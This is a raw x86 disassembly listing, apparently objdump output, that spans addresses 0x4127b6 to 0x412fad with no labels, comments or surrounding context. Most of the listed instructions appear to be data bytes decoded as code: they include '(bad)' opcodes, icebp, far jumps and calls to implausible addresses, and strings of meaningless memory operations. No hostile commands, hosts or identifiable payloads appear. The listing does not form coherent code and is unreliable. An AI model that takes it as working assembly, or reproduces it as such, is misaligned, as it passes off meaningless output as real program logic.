  4127b6:	add    BYTE PTR [eax],al
  4127b8:	test   DWORD PTR [eax],eax
  4127ba:	add    DWORD PTR [eax],esp
  4127bc:	push   cs
  4127bd:	inc    esp
  4127be:	add    dl,BYTE PTR [eax]
  4127c0:	sbb    DWORD PTR [eax+0x22214104],0x640220a0
  4127ca:	add    al,0x0
  4127cc:	shl    DWORD PTR [ecx],0x2
  4127cf:	rol    BYTE PTR [eax],0x3
  4127d2:	mov    al,0x41
  4127d4:	push   es
  4127d5:	mov    al,ds:0x22862022
  4127da:	add    dl,BYTE PTR [eax]
  4127dc:	add    BYTE PTR [eax+0x2],dl
  4127df:	test   DWORD PTR [ecx+0x2a],esp
  4127e2:	data16 or al,0x68
  4127e5:	sbb    DWORD PTR [ecx+ecx*2],eax
  4127e8:	sub    BYTE PTR [eax+0xa],0x42
  4127ec:	dec    eax
  4127ed:	adc    ch,BYTE PTR [edx-0x7c]
  4127f0:	xchg   cl,al
  4127f2:	or     BYTE PTR [eax+0x8107540],dh
  4127f8:	or     BYTE PTR [edx+0x60],dl
  4127fb:	xor    eax,0x42006256
  412800:	add    BYTE PTR [eax+edx*4-0x7bfcf7d8],ch
  412807:	push   0x8
  412809:	dec    esp
  41280a:	add    BYTE PTR [eax],dl
  41280c:	add    BYTE PTR [ecx],cl
  41280e:	mov    eax,ds:0x68200000
  412813:	inc    esp
  412814:	push   es
  412815:	sub    al,0x0
  412817:	add    BYTE PTR [eax+0x20080050],0x8
  41281e:	xor    al,BYTE PTR [eax]
  412820:	add    al,0x41
  412822:	add    BYTE PTR [eax+0x48],dl
  412825:	add    BYTE PTR [ecx],dl
  412827:	pusha  
  412828:	mov    al,0x5c
  41282a:	ret    0x42c0
  41282d:	xchg   BYTE PTR [eax],al
  41282f:	inc    ecx
  412830:	and    al,0x98
  412832:	or     al,al
  412834:	dec    edx
  412835:	adc    BYTE PTR [ecx],al
  412837:	adc    al,BYTE PTR fs:[eax]
  41283a:	and    BYTE PTR [eax],dh
  41283c:	cld    
  41283d:	and    al,0xa1
  41283f:	xchg   ecx,eax
  412840:	mov    al,BYTE PTR [eax+ecx*8]
  412843:	mov    ds:0x80141800,al
  412848:	loope  0x412857
  41284a:	adc    BYTE PTR [ecx],al
  41284c:	sbb    BYTE PTR [eax],al
  41284e:	xor    BYTE PTR [edx],ah
  412850:	pusha  
  412851:	mov    al,ss:0x24002830
  412857:	add    BYTE PTR [eax+0x5c30574],ah
  41285d:	mov    DWORD PTR [edx+0x20],ebx
  412860:	mov    edx,DWORD PTR [eax+0x67]
  412863:	loopne 0x41286a
  412865:	or     BYTE PTR [eax+eax*4+0x8],0x8a
  41286a:	add    BYTE PTR [eax+0x41241441],cl
  412870:	inc    eax
  412871:	push   eax
  412872:	fs add dl,dl
  412875:	add    BYTE PTR [eax],ah
  412877:	push   es
  412878:	and    DWORD PTR ds:0x7009d4,edx
  41287e:	adc    BYTE PTR [eax],al
  412880:	add    BYTE PTR [eax-0x58],ah
  412883:	adc    al,0x0
  412885:	adc    BYTE PTR [edx],ah
  412887:	adc    al,0x12
  412889:	add    BYTE PTR [edx],al
  41288b:	adc    dh,BYTE PTR [eax]
  41288d:	add    ebx,ebp
  41288f:	mov    cl,BYTE PTR [ecx]
  412891:	dec    eax
  412892:	cmp    BYTE PTR [esi],dl
  412894:	mov    BYTE PTR [ebx],al
  412896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412897:	add    DWORD PTR [esp+ebx*2],eax
  41289a:	adc    BYTE PTR ds:0x284141,dl
  4128a0:	add    eax,0x14b10006
  4128a5:	add    BYTE PTR cs:[ecx],dl
  4128a8:	inc    eax
  4128a9:	add    BYTE PTR [esp+eax*2],cl
  4128ac:	dec    esp
  4128ad:	inc    edx
  4128ae:	and    BYTE PTR [ecx-0x78],dl
  4128b1:	add    ah,BYTE PTR [ecx]
  4128b3:	adc    BYTE PTR [eax],al
  4128b5:	rol    DWORD PTR [edx+0x3a075600],0xb0
  4128bc:	test   DWORD PTR [edx+eax*4-0x1efdfef6],eax
  4128c3:	add    ecx,DWORD PTR [eax+0xa]
  4128c6:	mov    al,ds:0x86600908
  4128cb:	add    cl,BYTE PTR [esi]
  4128cd:	xchg   ecx,eax
  4128ce:	add    DWORD PTR [ebx],eax
  4128d0:	add    BYTE PTR [eax+0x8],0x50
  4128d4:	adc    DWORD PTR [eax-0x80],eax
  4128d7:	xor    al,0x2
  4128d9:	ret    0xe860
  4128dc:	mov    DWORD PTR [eax],ecx
  4128de:	add    BYTE PTR [eax],al
  4128e0:	add    ch,BYTE PTR [eax]
  4128e2:	or     BYTE PTR [ecx],al
  4128e4:	sub    dl,BYTE PTR [ebx]
  4128e6:	or     BYTE PTR [esp+ebp*1+0x4b20002],cl
  4128ed:	and    al,al
  4128ef:	inc    eax
  4128f0:	adc    BYTE PTR [ebp+eiz*1-0x25],dl
  4128f4:	adc    BYTE PTR [ebx+0x0],dl
  4128f7:	add    eax,DWORD PTR [eax+0x720d010]
  4128fd:	add    dl,BYTE PTR [eax+edx*1]
  412900:	push   ss
  412901:	repnz or ah,BYTE PTR [eax+eax*2]
  412905:	add    al,BYTE PTR [edx]
  412907:	add    BYTE PTR [ecx-0x7fe97fd0],dh
  41290d:	push   ecx
  41290e:	push   esp
  41290f:	mov    ds:0xa001c110,al
  412914:	add    al,0xa4
  412916:	and    ah,BYTE PTR [ecx]
  412918:	or     BYTE PTR [ecx],cl
  41291a:	dec    ebp
  41291b:	nop
  41291c:	add    BYTE PTR [edx+0x2a],ah
  41291f:	adc    cl,BYTE PTR [ebx+edx*1+0x1d030382]
  412926:	sub    BYTE PTR [eax],al
  412928:	push   eax
  412929:	or     DWORD PTR [ecx-0x80],0x434600
  412930:	(bad)  
  412931:	push   cs
  412932:	add    edx,DWORD PTR [edx]
  412934:	push   eax
  412935:	les    eax,FWORD PTR [ecx]
  412937:	add    eax,DWORD PTR [eax+0x20]
  41293a:	and    BYTE PTR [eax+0x486b10a3],ah
  412940:	push   es
  412941:	add    DWORD PTR [eax+0xa520832],edx
  412947:	add    al,0x0
  412949:	add    BYTE PTR [eax],ah
  41294b:	add    al,0x41
  41294d:	add    al,BYTE PTR [ecx]
  41294f:	add    BYTE PTR [ecx],al
  412951:	add    BYTE PTR [eax],al
  412953:	iret   
  412954:	and    BYTE PTR [eax],al
  412956:	pop    ebp
  412957:	sub    al,0x2
  412959:	and    edx,DWORD PTR [esi]
  41295b:	and    al,0x1e
  41295d:	popa   
  41295e:	sbb    eax,0x8c1c46
  412963:	sub    BYTE PTR [ebx],al
  412965:	mov    al,0x94
  412967:	jo     0x41297a
  412969:	adc    BYTE PTR [eax],al
  41296b:	add    al,BYTE PTR [ebp+0x40]
  41296e:	mov    al,0x10
  412970:	and    BYTE PTR [ecx+edx*1],dl
  412973:	mov    al,ds:0x282a6181
  412978:	add    cl,dl
  41297a:	add    BYTE PTR [ecx],ah
  41297c:	les    eax,FWORD PTR [eax]
  41297e:	adc    al,ch
  412980:	add    BYTE PTR [ecx],dl
  412982:	add    al,0x60
  412984:	adc    DWORD PTR [ebx-0x76],esp
  412987:	or     BYTE PTR [eax],ch
  412989:	inc    eax
  41298a:	mov    al,ds:0x1814000
  41298f:	adc    al,0x1
  412991:	or     BYTE PTR [eax],ah
  412993:	adc    eax,DWORD PTR ds:0x38c02a10
  412999:	xor    BYTE PTR [edx+0x20998465],0xa0
  4129a0:	and    DWORD PTR [ecx-0x3e],eax
  4129a3:	sub    eax,DWORD PTR [ecx+0xc8009c0]
  4129a9:	or     BYTE PTR [ebx],al
  4129ab:	cmp    cl,BYTE PTR [ebp-0x7b2fffaf]
  4129b1:	add    BYTE PTR [eax],cl
  4129b3:	adc    BYTE PTR [eax+0x10],al
  4129b6:	or     DWORD PTR [esi],edx
  4129b8:	add    BYTE PTR [eax],bl
  4129ba:	or     DWORD PTR [eax+ebx*8],eax
  4129bd:	sub    DWORD PTR [esp+edx*8],eax
  4129c0:	push   eax
  4129c1:	inc    eax
  4129c2:	add    BYTE PTR [eax],dh
  4129c4:	add    BYTE PTR [edx+edx*1],0xc3
  4129c8:	sub    BYTE PTR [eax],0xa5
  4129cb:	add    BYTE PTR [eax],cl
  4129cd:	or     eax,DWORD PTR [ecx]
  4129cf:	adc    esp,DWORD PTR [eax-0x5edf53ff]
  4129d5:	add    al,0x0
  4129d7:	add    al,0xa0
  4129d9:	sub    al,0x68
  4129db:	mov    BYTE PTR [esp+eax*2+0x958000],al
  4129e2:	sub    BYTE PTR [eax+edx*1],0xa
  4129e6:	inc    eax
  4129e7:	and    al,BYTE PTR [eax+0x48228004]
  4129ed:	dec    eax
  4129ee:	mov    BYTE PTR [eax],cl
  4129f0:	add    DWORD PTR [eax],ecx
  4129f2:	or     BYTE PTR [eax+0x12],0x5
  4129f6:	lea    eax,[ecx+0x2]
  4129f9:	or     al,0x80
  4129fb:	sbb    BYTE PTR [eax],al
  4129fd:	push   eax
  4129fe:	cmp    al,0x0
  412a00:	rol    BYTE PTR [eax+0x4e],cl
  412a03:	mov    al,ds:0x8000a100
  412a08:	or     edx,DWORD PTR [edi]
  412a0a:	add    dh,BYTE PTR [eax+0x49200018]
  412a10:	sbb    BYTE PTR [edx+eax*4],ch
  412a13:	or     al,0x0
  412a15:	adc    ah,BYTE PTR [eax]
  412a17:	push   ss
  412a18:	or     BYTE PTR [eax],cl
  412a1a:	or     BYTE PTR [edx+0x21251206],0x14
  412a21:	mov    al,BYTE PTR [esi]
  412a23:	jae    0x412a27
  412a25:	add    BYTE PTR [eax+0x638102],dl
  412a2b:	adc    BYTE PTR es:[eax+edx*1-0x43ffffe0],ch
  412a33:	mov    bh,0x80
  412a35:	or     BYTE PTR [eax],al
  412a37:	add    BYTE PTR [edx],ah
  412a39:	cwde   
  412a3a:	xchg   ecx,eax
  412a3b:	or     al,0x0
  412a3d:	push   ecx
  412a3e:	add    eax,0x88040c80
  412a43:	adc    BYTE PTR [eax],0xca
  412a46:	add    cl,BYTE PTR [eax]
  412a48:	and    eax,0x849965aa
  412a4d:	inc    eax
  412a4e:	add    ah,BYTE PTR [ebx+0x18202e]
  412a54:	or     BYTE PTR [eax+eax*4],al
  412a57:	add    eax,0x12008012
  412a5c:	add    al,0xa3
  412a5e:	or     BYTE PTR [eax+0x52485250],dl
  412a64:	and    BYTE PTR [eax],dl
  412a66:	and    cl,BYTE PTR [edx]
  412a68:	add    eax,ecx
  412a6a:	inc    edx
  412a6b:	add    al,0x22
  412a6d:	adc    DWORD PTR [ebx-0x7fed4000],0x40205032
  412a77:	add    BYTE PTR [eax],0x0
  412a7a:	and    al,0x0
  412a7c:	add    BYTE PTR [edx+0x42],cl
  412a7f:	xor    BYTE PTR [edx],bl
  412a81:	and    BYTE PTR [esi+0x8040415],ah
  412a87:	or     dl,BYTE PTR [eax+0x4]
  412a8a:	xchg   ecx,eax
  412a8b:	inc    eax
  412a8c:	inc    esp
  412a8d:	adc    al,0x2
  412a8f:	add    BYTE PTR ds:0x108490,al
  412a95:	pusha  
  412a96:	and    DWORD PTR [eax+0x10700026],ecx
  412a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a9d:	sbb    BYTE PTR [esi+0xd02308],al
  412aa3:	add    al,0xc1
  412aa5:	adc    BYTE PTR [edx],cl
  412aa7:	and    DWORD PTR [eax],0x201090a
  412aad:	add    BYTE PTR [eax],0x34
  412ab0:	add    al,BYTE PTR [eax]
  412ab2:	cdq    
  412ab3:	and    BYTE PTR [ecx+eiz*2],al
  412ab6:	and    BYTE PTR [eax],al
  412ab8:	or     BYTE PTR [edx],cl
  412aba:	and    DWORD PTR [eax],eax
  412abc:	and    BYTE PTR [edx],al
  412abe:	add    DWORD PTR [edx+0x7],ecx
  412ac1:	and    ebp,ecx
  412ac3:	or     BYTE PTR [eax+0x401b38],al
  412ac9:	dec    eax
  412aca:	and    DWORD PTR [eax-0x70],esp
  412acd:	inc    ecx
  412ace:	sbb    DWORD PTR [eax],ecx
  412ad0:	or     al,0x16
  412ad2:	or     eax,DWORD PTR ds:0xa1022043
  412ad8:	or     esp,DWORD PTR [eax+0x6b304050]
  412ade:	adc    al,0x69
  412ae0:	push   0xd2d8303c
  412ae5:	mov    ds:0x3a224a08,al
  412aea:	icebp  
  412aeb:	or     al,0x1
  412aed:	add    DWORD PTR [ebp-0x80],eax
  412af0:	inc    ax
  412af2:	and    ah,BYTE PTR [edx]
  412af4:	add    DWORD PTR [eax-0x77fdff38],eax
  412afa:	add    eax,0x50c4c09
  412aff:	sbb    ah,BYTE PTR [ebx]
  412b01:	and    BYTE PTR [eax+0x480002f0],ch
  412b07:	inc    eax
  412b08:	push   eax
  412b09:	add    al,0x0
  412b0b:	add    BYTE PTR [edx+0x40218102],al
  412b11:	call   0xc0537727
  412b16:	jno    0x412ae9
  412b18:	pop    eax
  412b19:	jb     0x412b21
  412b1b:	jns    0x412b20
  412b1d:	add    al,0xc6
  412b1f:	cmp    BYTE PTR [ebx+0x20],cl
  412b22:	cwde   
  412b23:	push   es
  412b24:	add    al,al
  412b26:	sub    al,0x79
  412b28:	add    BYTE PTR [ecx+0x40424064],dh
  412b2e:	les    ecx,FWORD PTR [eax-0x77ff6000]
  412b34:	add    al,0xc
  412b36:	add    eax,DWORD PTR [eax]
  412b38:	and    BYTE PTR [eax+edx*1],dl
  412b3b:	inc    eax
  412b3c:	test   al,0x10
  412b3e:	pop    ss
  412b3f:	or     ah,BYTE PTR [eax+edx*2+0x20]
  412b43:	and    eax,0x24208090
  412b48:	test   BYTE PTR [ecx+0x8338f],al
  412b4e:	jo     0x412b59
  412b50:	enter  0x218,0x42
  412b54:	mov    eax,0x850202c0
  412b59:	add    BYTE PTR ds:0xc442a80,0xe
  412b60:	inc    ecx
  412b61:	aad    0x0
  412b63:	test   BYTE PTR [eax],al
  412b65:	xor    BYTE PTR [eax],0x41
  412b68:	add    dh,BYTE PTR [edx+0x56]
  412b6b:	push   ebx
  412b6c:	inc    edx
  412b6d:	add    BYTE PTR [ebx+eax*8+0x20],ah
  412b71:	nop
  412b72:	and    BYTE PTR [eax+0x19021041],0xa8
  412b79:	add    BYTE PTR [ecx+0x2a000141],al
  412b7f:	cwde   
  412b80:	add    BYTE PTR [eax],0x0
  412b83:	add    BYTE PTR [ecx-0x6e],al
  412b86:	and    al,BYTE PTR [eax]
  412b88:	test   BYTE PTR [eax+0x0],ah
  412b8b:	add    BYTE PTR [edx],al
  412b8d:	and    al,BYTE PTR [eax]
  412b8f:	and    BYTE PTR [ebx-0x5b3dfdf8],dl
  412b95:	xor    DWORD PTR [eax],ecx
  412b97:	inc    esi
  412b98:	add    BYTE PTR [eax+0x40000100],dl
  412b9e:	or     dl,BYTE PTR [ebx]
  412ba0:	or     esi,DWORD PTR [edx+0x0]
  412ba3:	mov    DWORD PTR [edx],eax
  412ba5:	sub    BYTE PTR [eax+0x48008cb0],cl
  412bab:	add    BYTE PTR [eax],al
  412bad:	or     al,0x5
  412baf:	add    BYTE PTR [edx+ebp*4],0x0
  412bb3:	arpl   WORD PTR [ecx],ax
  412bb5:	inc    eax
  412bb6:	xchg   edx,eax
  412bb7:	inc    eax
  412bb8:	push   0x224c2232
  412bbd:	and    BYTE PTR [ecx],al
  412bbf:	xor    al,dl
  412bc1:	add    eax,esp
  412bc3:	sub    DWORD PTR [eax],ebx
  412bc5:	adc    BYTE PTR [eax],dl
  412bc7:	add    BYTE PTR [edx+0x40888001],dl
  412bcd:	or     DWORD PTR [eax],eax
  412bcf:	add    BYTE PTR [eax],al
  412bd1:	or     ch,BYTE PTR [eax]
  412bd3:	sbb    BYTE PTR [eax],dl
  412bd5:	and    BYTE PTR [edx+0xa918ca],bl
  412bdb:	enter  0x8b2,0x0
  412bdf:	add    BYTE PTR [eax],ah
  412be1:	add    BYTE PTR [eax+ecx*2],al
  412be4:	add    cl,al
  412be6:	sbb    BYTE PTR [esi],dl
  412be8:	or     DWORD PTR [edx],ebx
  412bea:	push   es
  412beb:	xor    BYTE PTR [eax+edx*1],bh
  412bee:	or     BYTE PTR [ecx],0x20
  412bf1:	mov    cl,0x94
  412bf3:	add    DWORD PTR [esi+0x54141078],0x28e0267
  412bfd:	add    BYTE PTR [eax],ah
  412bff:	ret    0x891
  412c02:	rcl    DWORD PTR [ecx+eax*1-0x67dfff7a],1
  412c09:	xor    bh,BYTE PTR [eax]
  412c0b:	mov    ah,BYTE PTR [eax]
  412c0d:	mov    al,ds:0x206ad20
  412c12:	and    al,BYTE PTR [ecx+0x41]
  412c15:	add    BYTE PTR [ecx-0x68],cl
  412c18:	adc    BYTE PTR [edx+0x46],cl
  412c1b:	sub    BYTE PTR [eax-0x7cdd9ba0],bl
  412c21:	add    edx,esi
  412c23:	or     dl,BYTE PTR [eax]
  412c25:	push   ds
  412c26:	pop    es
  412c27:	adc    eax,0x88000
  412c2c:	add    DWORD PTR [ebx],edx
  412c2e:	add    al,0x92
  412c30:	push   eax
  412c31:	xchg   BYTE PTR [eax],ch
  412c33:	and    BYTE PTR [ecx],ah
  412c35:	sub    DWORD PTR [ecx+0x7082c801],eax
  412c3b:	xchg   ecx,eax
  412c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c3d:	and    BYTE PTR [eax+eax*1],al
  412c40:	add    BYTE PTR [eax+0x628a20],bl
  412c46:	add    BYTE PTR [eax],dl
  412c48:	adc    al,0x30
  412c4a:	mov    eax,0x84b90224
  412c4f:	and    DWORD PTR [edx],0x39
  412c52:	add    ah,BYTE PTR [ecx]
  412c54:	and    BYTE PTR [edx],cl
  412c56:	add    al,0xf0
  412c58:	call   0x4c51b466
  412c5d:	or     al,0x48
  412c5f:	or     BYTE PTR [eax],al
  412c61:	inc    eax
  412c62:	and    DWORD PTR [eax],eax
  412c64:	mov    al,ds:0x34885d11
  412c69:	cwde   
  412c6a:	cwde   
  412c6b:	inc    eax
  412c6c:	add    DWORD PTR [edx+0x700208a8],eax
  412c72:	rol    BYTE PTR [eax],0x0
  412c75:	add    DWORD PTR gs:[eax-0x5ffffd7d],0x61910015
  412c80:	add    ecx,DWORD PTR [ecx]
  412c82:	inc    eax
  412c83:	sub    BYTE PTR [eax],cl
  412c85:	mov    al,ds:0x350111
  412c8a:	cwde   
  412c8b:	cmp    cl,BYTE PTR [ecx]
  412c8d:	sbb    cl,BYTE PTR [eax]
  412c8f:	add    BYTE PTR [eax-0x5f3bf1f0],cl
  412c95:	or     ah,BYTE PTR [ebx]
  412c97:	and    BYTE PTR [eax],al
  412c99:	test   al,0x0
  412c9b:	add    al,0x0
  412c9d:	or     esp,0x80685025
  412ca3:	xchg   BYTE PTR [ecx+0x100580d0],al
  412ca9:	adc    BYTE PTR [ebx],bl
  412cab:	pop    ss
  412cac:	add    BYTE PTR [eax+0x0],al
  412caf:	mov    ds:0x200a8069,al
  412cb4:	or     DWORD PTR [eax],eax
  412cb6:	inc    ebx
  412cb7:	or     BYTE PTR [ecx+eax*1+0x10400405],bl
  412cbe:	add    BYTE PTR [ecx+eax*1],0x2
  412cc2:	pusha  
  412cc3:	or     BYTE PTR [ecx+0x18],al
  412cc6:	or     DWORD PTR [edx],eax
  412cc8:	or     BYTE PTR [edi+ecx*2+0x1],cl
  412ccc:	inc    ecx
  412ccd:	add    BYTE PTR ds:0x11045d4a,al
  412cd3:	add    BYTE PTR [eax-0x5793cf00],cl
  412cd9:	mov    DWORD PTR [ecx+0x35308d70],eax
  412cdf:	or     bh,BYTE PTR [edx+0x21]
  412ce2:	sub    al,BYTE PTR [esp+edx*2]
  412ce5:	add    BYTE PTR [edx],al
  412ce7:	xor    al,0x1d
  412ce9:	add    BYTE PTR [eax+0xe],al
  412cec:	add    BYTE PTR [ecx+edx*1+0x3221c90a],dl
  412cf3:	xchg   ecx,eax
  412cf4:	add    BYTE PTR [eax+ebx*1+0x17028821],0x10
  412cfc:	inc    eax
  412cfd:	xchg   edx,eax
  412cfe:	adc    al,0x8
  412d00:	and    BYTE PTR ds:0x900b011,al
  412d06:	and    eax,0x440f036
  412d0b:	and    al,0x80
  412d0d:	or     DWORD PTR [ecx+ebx*1],esp
  412d10:	inc    esp
  412d11:	add    al,0x10
  412d13:	(bad)  
  412d15:	add    BYTE PTR [eax],cl
  412d17:	add    dl,BYTE PTR [eax]
  412d19:	add    BYTE PTR ds:0x1004550a,ah
  412d1f:	inc    eax
  412d20:	xchg   ebx,eax
  412d21:	or     eax,0x3c8bc6
  412d26:	add    DWORD PTR [esi-0x67f7bb80],eax
  412d2c:	mov    edx,0x8163080e
  412d31:	inc    eax
  412d32:	add    BYTE PTR [eax+eax*1],ch
  412d35:	adc    al,0xc
  412d37:	add    esi,DWORD PTR [ecx]
  412d39:	push   ecx
  412d3a:	inc    eax
  412d3b:	add    al,BYTE PTR [edx+0x60580050]
  412d41:	or     cl,dl
  412d43:	fld    QWORD PTR [eax]
  412d45:	xor    BYTE PTR [edi],al
  412d47:	add    BYTE PTR [eax],al
  412d49:	mov    al,0x3
  412d4b:	or     al,0xad
  412d4d:	inc    ecx
  412d4e:	add    eax,0x532101
  412d53:	add    ch,al
  412d55:	adc    BYTE PTR [eax],dl
  412d57:	enter  0x4082,0x44
  412d5b:	test   BYTE PTR [eax],ah
  412d5d:	adc    al,0x99
  412d5f:	jbe    0x412d81
  412d61:	nop
  412d62:	or     dl,BYTE PTR [eax+eax*4-0x7ffeb2cf]
  412d69:	add    BYTE PTR [esp+0x0],cl
  412d6d:	ror    al,0x2
  412d70:	pusha  
  412d71:	dec    ebx
  412d72:	shl    BYTE PTR [ecx],0x40
  412d75:	add    BYTE PTR [eax+0x38100c04],cl
  412d7b:	or     BYTE PTR [eax],ah
  412d7d:	inc    ebx
  412d7e:	pusha  
  412d7f:	add    eax,0x8228043f
  412d84:	das    
  412d85:	sub    esi,DWORD PTR [esi+eax*4+0x4]
  412d89:	or     BYTE PTR [eax-0x10],al
  412d8c:	shr    BYTE PTR ds:0x9d0621c8,0x2
  412d93:	data16 adc dl,al
  412d96:	add    eax,DWORD PTR [eax]
  412d98:	or     BYTE PTR [eax+0x3c802148],cl
  412d9e:	sub    DWORD PTR [edx],ecx
  412da0:	push   eax
  412da1:	mov    eax,es
  412da3:	(bad)  
  412da4:	jmp    0x1887:0x110b40a8
  412dab:	or     BYTE PTR [ecx+0x2018208],ah
  412db1:	add    BYTE PTR [eax+0x5e314c0e],al
  412db7:	add    BYTE PTR [edx],dl
  412db9:	add    BYTE PTR [edx-0x6b],al
  412dbc:	sub    al,BYTE PTR [eax-0x7f2ef930]
  412dc2:	pusha  
  412dc3:	push   ecx
  412dc4:	ret    0x6400
  412dc7:	sub    esi,DWORD PTR [eax+0xc]
  412dca:	dec    eax
  412dcb:	adc    BYTE PTR [ecx+0x50],bl
  412dce:	mov    cl,BYTE PTR [edx+eax*1-0x6b]
  412dd2:	xor    eax,DWORD PTR [ecx+0x1c]
  412dd5:	add    BYTE PTR [ecx],al
  412dd7:	add    al,0x0
  412dd9:	add    BYTE PTR [ecx+0x40],dh
  412ddc:	add    dh,BYTE PTR [edx+0x150306b8]
  412de2:	add    BYTE PTR [eax],cl
  412de4:	dec    edx
  412de5:	add    DWORD PTR [esi],0x12251514
  412deb:	inc    edx
  412dec:	and    BYTE PTR [eax+0x3100484],al
  412df2:	add    BYTE PTR [eax+edx*2],ch
  412df5:	pusha  
  412df6:	test   al,0x14
  412df8:	add    BYTE PTR [ebp-0x6ee3e68],al
  412dfe:	and    BYTE PTR [edx],0x23
  412e01:	adc    BYTE PTR es:[eax],al
  412e04:	add    eax,0x100e4a
  412e09:	aam    0xca
  412e0b:	stos   BYTE PTR es:[edi],al
  412e0c:	sub    edx,DWORD PTR [ebp+0x0]
  412e0f:	or     al,0x60
  412e11:	add    al,0x0
  412e13:	or     eax,DWORD PTR [eax+eax*1]
  412e16:	cmp    al,BYTE PTR [eax+0x41802]
  412e1c:	sbb    BYTE PTR [eax],ah
  412e1e:	adc    DWORD PTR [eax-0x3d],eax
  412e21:	or     al,BYTE PTR [edx]
  412e23:	add    BYTE PTR [ecx],al
  412e25:	add    BYTE PTR [eax-0x5f],dl
  412e28:	add    BYTE PTR [eax],ch
  412e2a:	cmp    BYTE PTR [eax+eiz*4],al
  412e2d:	mov    eax,ds:0x1180048
  412e32:	and    al,0x98
  412e34:	jo     0x412e76
  412e36:	sbb    BYTE PTR [eax],al
  412e38:	xchg   esp,eax
  412e39:	add    cl,BYTE PTR [eax]
  412e3b:	push   ebp
  412e3c:	xchg   ecx,eax
  412e3d:	inc    edx
  412e3e:	adc    BYTE PTR [eax+eiz*4],ch
  412e41:	mov    al,ds:0x8008180
  412e46:	or     DWORD PTR [eax],esp
  412e48:	dec    ebx
  412e49:	or     BYTE PTR [ebp+0x42],al
  412e4c:	sbb    BYTE PTR [eax+0x1],ah
  412e4f:	mov    al,ds:0x81a29514
  412e54:	adc    BYTE PTR [eax-0x5e],0x45
  412e58:	inc    esi
  412e59:	xor    BYTE PTR [ebx],al
  412e5b:	add    BYTE PTR [ecx],cl
  412e5d:	and    al,0x2
  412e5f:	pusha  
  412e60:	sub    BYTE PTR [ecx+0x41],al
  412e63:	inc    eax
  412e64:	add    cl,BYTE PTR [ebx]
  412e66:	adc    BYTE PTR [esi],dl
  412e68:	push   cs
  412e69:	sub    al,0x32
  412e6b:	cmp    al,BYTE PTR [eax]
  412e6d:	or     dl,BYTE PTR [ecx]
  412e6f:	call   0x16c1451e
  412e74:	adc    DWORD PTR [eax],esp
  412e76:	add    BYTE PTR [eax],al
  412e78:	mov    DWORD PTR [eax+0x881c848],ebx
  412e7e:	add    BYTE PTR [eax],bl
  412e80:	test   DWORD PTR [ecx+0x5048d21],eax
  412e86:	add    BYTE PTR [edx],0x4
  412e89:	add    al,BYTE PTR [eax]
  412e8b:	and    al,BYTE PTR [eax+0xf]
  412e8e:	add    BYTE PTR [eax+0x5c022006],dl
  412e94:	sbb    BYTE PTR [ebp-0x76],cl
  412e97:	inc    edi
  412e98:	adc    esi,DWORD PTR [eax]
  412e9a:	popa   
  412e9b:	and    BYTE PTR [eax+0x16014a10],cl
  412ea1:	xchg   BYTE PTR [eax],al
  412ea3:	mov    al,ds:0x4702a5
  412ea8:	add    dl,al
  412eaa:	mov    BYTE PTR [eax+edx*1+0x22091014],bl
  412eb1:	inc    eax
  412eb2:	test   BYTE PTR [eax+0x24],cl
  412eb5:	add    BYTE PTR [eax+0x1b8a3004],al
  412ebb:	adc    BYTE PTR [eax],0xb1
  412ebe:	and    al,BYTE PTR [esp+ecx*2-0x60]
  412ec2:	push   eax
  412ec3:	adc    BYTE PTR [esi],al
  412ec5:	push   es
  412ec6:	mov    eax,ds:0x8410004a
  412ecb:	add    al,0x10
  412ecd:	sub    BYTE PTR [eax],al
  412ecf:	adc    dl,BYTE PTR [esi]
  412ed1:	adc    BYTE PTR [ecx-0x5b],0x1d
  412ed5:	adc    eax,0x40d00518
  412eda:	mov    al,ds:0x405c582e
  412edf:	add    BYTE PTR [eax+0x550c440],ch
  412ee5:	and    BYTE PTR [ecx+0x22340308],cl
  412eeb:	add    DWORD PTR [ebx],ebp
  412eed:	add    al,0x4
  412eef:	and    BYTE PTR [eax],cl
  412ef1:	or     BYTE PTR [esp+eax*1],al
  412ef4:	and    BYTE PTR [eax],cl
  412ef6:	or     BYTE PTR [eax-0x795ef96b],cl
  412efc:	adc    bl,BYTE PTR [eax+0x29a5458c]
  412f02:	adc    BYTE PTR [ecx+0x5989c102],cl
  412f08:	add    BYTE PTR [esi],al
  412f0a:	add    DWORD PTR [eax-0x78],eax
  412f0d:	add    BYTE PTR [ecx],dl
  412f0f:	mov    ds:0x4659264,al
  412f14:	sbb    al,0x5b
  412f17:	add    BYTE PTR [eax+0x58040960],al
  412f1d:	es inc ecx
  412f1f:	add    DWORD PTR [ebp+0xa71a155],edx
  412f25:	dec    eax
  412f26:	adc    BYTE PTR [esi+ebp*1],al
  412f29:	dec    eax
  412f2a:	or     ebp,ebp
  412f2c:	xchg   esp,eax
  412f2d:	or     eax,0x8008824
  412f32:	or     DWORD PTR [edi],esp
  412f34:	adc    BYTE PTR [eax+0x4023040],0xa3
  412f3b:	xor    BYTE PTR [edx+0xa308049],al
  412f41:	add    BYTE PTR [ecx+eax*4],dl
  412f44:	or     al,BYTE PTR [ebp+eax*2+0x38]
  412f48:	xor    DWORD PTR [eax+0x2d],ebp
  412f4b:	ret    0x5004
  412f4e:	and    BYTE PTR [eax+0x4],al
  412f51:	adc    bh,bh
  412f53:	adc    eax,0x435cd4
  412f58:	mov    eax,ds:0x6c888209
  412f5d:	inc    ax
  412f5f:	dec    esp
  412f60:	or     BYTE PTR [eax],al
  412f62:	add    BYTE PTR [esi],al
  412f64:	or     al,0x58
  412f66:	add    BYTE PTR [eax+0x6],al
  412f69:	or     al,0x10
  412f6b:	add    BYTE PTR [ecx+0x2],cl
  412f6e:	pusha  
  412f6f:	mov    edx,0x2742400
  412f74:	mov    ds:0xa045140,al
  412f79:	push   eax
  412f7a:	inc    esi
  412f7b:	push   0xffffffc8
  412f7d:	adc    al,ah
  412f7f:	add    eax,0x26014085
  412f84:	or     eax,0x4d800608
  412f89:	or     DWORD PTR [eax+0x4a504a40],eax
  412f8f:	add    DWORD PTR [edx+0x5c804c18],ebx
  412f95:	je     0x412f9e
  412f97:	sub    BYTE PTR [eax+edx*2],0x4e
  412f9b:	mov    BYTE PTR [eax],ch
  412f9d:	pusha  
  412f9e:	add    BYTE PTR [eax],cl
  412fa0:	dec    eax
  412fa1:	xchg   esp,eax
  412fa2:	add    eax,0x72212a64
  412fa7:	or     DWORD PTR [esi],0x41206052
  412fad:	rcl    DWORD PTR [edx-0x7f],1
